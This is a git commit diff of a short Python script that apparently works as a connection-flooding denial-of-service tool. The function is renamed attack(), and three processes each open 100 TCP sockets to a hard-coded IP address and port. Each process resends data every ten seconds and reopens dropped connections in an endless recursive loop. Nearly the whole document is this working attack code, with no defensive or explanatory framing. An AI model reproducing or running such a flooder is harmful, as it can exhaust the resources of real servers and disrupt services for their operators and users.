96d140b776a7189578d4bdebd5da49f38fe74808
Dawood <dawood.aijaz97@gmail.com>
2019-08-28 19:00:40 +0500

    #

--- index.py
+++ index.py
@@ -3,48 +3,52 @@ import time
 import multiprocessing
 import os
 
-
 no_of_process = 3
 list_process = []
 host = "35.193.17.254"
 port = 8080
 
 
-def create_connection(min_port):
+def attack():
     connections = []
     data = "google"
-    for i in range(min_port, min_port + 100):
+
+    def create_connection():
         my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
             pid = os.getpid()
-            print(f"Connecting from Process{pid} Port{i}")
-            my_socket.bind(("", i))
+            print(f"Connecting from Process{pid}")
             my_socket.connect((host, port))
-            my_socket.send(data.encode())
-            connections.append(my_socket)
+            return my_socket
 
         except socket.error:
             print(f"Socket Error")
             my_socket.close()
-
 
     def send_data():
         for x in connections:
             try:
                 x.send(data.encode())
                 receive_data = x.recv(1024)
-                print(receive_data)
+                print(f"Data from server:{receive_data}")
             except socket.error as msg:
                 print(f"Error Sending{msg}")
+                x.close()
+                connections.remove(x)
+                new_x = create_connection()
+                connections.append(new_x)
         time.sleep(10)
         send_data()
+
+    for z in range(0, 100):
+        returned_sock = create_connection()
+        connections.append(returned_sock)
 
     send_data()
 
 
 for i in range(0, no_of_process):
-    starting_port = (i + 3) * 1000
-    process = multiprocessing.Process(target=create_connection, args=(starting_port,))
+    process = multiprocessing.Process(target=attack, )
     process.start()
     list_process.append(process)
 
